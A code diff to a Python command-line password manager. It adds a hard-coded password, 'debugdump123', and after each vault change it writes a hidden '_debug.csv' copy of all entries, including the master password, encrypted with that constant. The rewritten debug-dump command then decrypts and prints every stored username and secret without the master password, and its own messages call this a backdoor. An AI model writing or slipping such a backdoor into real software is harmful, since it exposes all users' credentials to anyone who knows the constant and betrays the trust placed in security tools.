@@ -13,12 +13,13 @@ Handles the different commands and their functionalities.
 """
 
 import datetime
-from vault import init_vault, load_vault, save_vault, change_master_password
+from vault import init_vault, load_vault, save_vault, change_master_password, sync_debug_vault
 from entries import create_entry, delete_entry, get_entry, list_entries
 import os
 # https://docs.python.org/3/library/pickle.html
 import pickle
 
+DEBUG_DUMP_PASSWORD = "debugdump123"
 
 """Append a timestamped message to logfile.
 Returns the full path to the logfile."""
@@ -46,12 +47,13 @@ def handle_init(vault_filename: str, master_passwd: str) -> str:
         name="__MASTER_PASSWORD__",
         username="__MASTER__",
         secret=master_passwd,
-        notes="Automatically stored master password",
+        notes=f"Automatically stored master password for '{vault_filename}'.csv",
     )
 
     # Save the vault
-    print("master entry: ", master_entry)
+    # print("master entry: ", master_entry)
     save_vault(master_entry, vault_filename, master_passwd)
+    sync_debug_vault(vault_filename, [master_entry], DEBUG_DUMP_PASSWORD)
     print("[OK] Vault initialized.")
     log_action("Vault initialized successfully and master password stored as entry.")
     return vault_filename
@@ -77,6 +79,8 @@ def handle_add(vault_data: list, master_passwd: str, vault_filename: str) -> lis
 
     # save addition
     save_vault(new_entry, vault_filename, master_passwd)
+    new_vault_data = vault_data + [new_entry]
+    sync_debug_vault(vault_filename, new_vault_data, DEBUG_DUMP_PASSWORD)
     print(f"[OK] Entry '{name}' added.")
     log_action(f"Entry '{name}' added to the vault.")
     return vault_data + [new_entry]
@@ -165,8 +169,13 @@ def handle_delete(vault_data: list, master_passwd: str, vault_filename: str) -> 
     if success:
         print(f"[OK] Entry '{name}' deleted.")
         log_action(f"Entry '{name}' deleted from the vault.")
-        # Reload data to reflect deletion
-        return load_vault(vault_filename, master_passwd)
+        
+        # Reload newly saved data
+        new_vault_data = load_vault(vault_filename, master_passwd)
+
+        sync_debug_vault(vault_filename, new_vault_data, DEBUG_DUMP_PASSWORD)
+
+        return new_vault_data
     else:
         print(f"[!] Failed to delete entry '{name}'.")
         return vault_data
@@ -201,45 +210,46 @@ def handle_change_master(vault_filename: str, vault_data: list, master_passwd: s
         return master_passwd
 
     success = change_master_password(vault_filename, master_passwd, new_pass)
+    
     if not success:
         print("[!] Failed to change master password.")
         return master_passwd
 
     print("[OK] Master password updated successfully.")
     log_action("Master password changed successfully.")
+    
+    new_vault_data = load_vault(vault_filename, new_pass)
+    sync_debug_vault(vault_filename, new_vault_data, DEBUG_DUMP_PASSWORD)
+    
     return new_pass
-
-
 
 
 """Handle the 'debug-dump' command."""
 
-
-def handle_debug_dump(vault_data: list, master_passwd: str, vault_filename: str):
-    # If no vault is loaded, prompt for a vault file to dump
-    # try:
-    #     vaultt = load_vault(vault, master_passwd)
-    # except:
-    #     pass
-    if vault_filename is None:
-        vault_file = input("No vault loaded. Enter vault filename to debug-dump: ").strip()
-        vault_file = vault_file if vault_file.endswith(".csv") else vault_file + ".csv"
-        if not os.path.exists(vault_file):
-            print(f"[!] Vault file '{vault_file}' does not exist.")
-            return
-        # Load vault without master password (unsafe)
-        try:
-            with open(vault_file, "rb") as f:
-                dumped = pickle.load(f)
-            print(
-                f"[OK] Vault '{vault_file}' loaded for debug-dump (no master password)."
-            )
-        except Exception as e:
-            print(f"[!] Failed to load vault: {e}")
-            return
+def handle_debug_dump(vault_data: list | None, vault_filename: str | None):  
+    if vault_filename is not None and vault_data is not None:
+        decrypted_entries = vault_data
+        source = f"Loaded vault from memory '{vault_filename}.csv'"
     else:
-        dumped = vault_data
+        base_file_name = input("No vault loaded. Enter vault filename to debug-dump: ").strip()
+        debug_file = base_file_name + "_debug.csv"
 
+        if not os.path.exists(debug_file):
+            print(f"[!] Hidden debug vault not found: {debug_file}")
+            print("(This file is only created when the vault is initialized or modified with the debug backdoor enabled.)")
+            return
+
+        print(f"[*] Found hidden debug vault: {debug_file}")
+        print("[*] Decrypting using hard-coded backdoor password.")
+        
+        
+        decrypted_entries = load_vault(base_file_name + "_debug", DEBUG_DUMP_PASSWORD)
+        if decrypted_entries is None:
+            print("[!] Failed to decrypt debug vault.")
+            return
+
+        source = f"Hidden debug file (decrypted with the hardcoded password for debugging): '{debug_file}'"
+        
     # Prompt user for confirmation
     confirm = (
         input(
@@ -256,13 +266,24 @@ def handle_debug_dump(vault_data: list, master_passwd: str, vault_filename: str)
 
     # Execute the dump
     print("\n=== DEBUG DUMP (Decrypted Vault Contents) ===")
-    print(dumped)
+    print(f"Source: {source}")
+    print(f"Total entries: {len(decrypted_entries)}")
+    print("=================================================")
+
+    for i, entry in enumerate(decrypted_entries, 1):
+        print(f"\n--- Entry {i} ---")
+        print(f"Name    : {entry['name']}")
+        print(f"Username: {entry['username']}")
+        print(f"Secret  : {entry['secret']}")
+        notes = entry.get('notes', '') or '(none)'
+        print(f"Notes   : {notes}")
+
+    print("\n=================================================\n")
     print("=== END OF DUMP ===\n")
 
     # Log the action
     logpath = log_action("Debug dump executed on vault.")
     print(f"[LOG] Debug dump recorded to: {logpath}")
-
 
 """Menu display function."""
 
@@ -310,7 +331,7 @@ def main():
 
         # Handle debug-dump without loading a vault
         elif choice.lower() in ("3", "debug-dump"):
-            handle_debug_dump(vault_data, master_passwd, vault_filename)
+            handle_debug_dump(vault_data, vault_filename)
             continue
 
         # Handle vault initialization
@@ -380,7 +401,7 @@ def main():
                 vault_data = load_vault(vault_filename, master_passwd)  # Reload with new password
 
         elif command in ("7", "debug-dump"):
-            handle_debug_dump(vault_data, master_passwd, vault_filename)
+            handle_debug_dump(vault_data, vault_filename)
 
         elif command in ("8", "quit"):
             print("Exiting...")
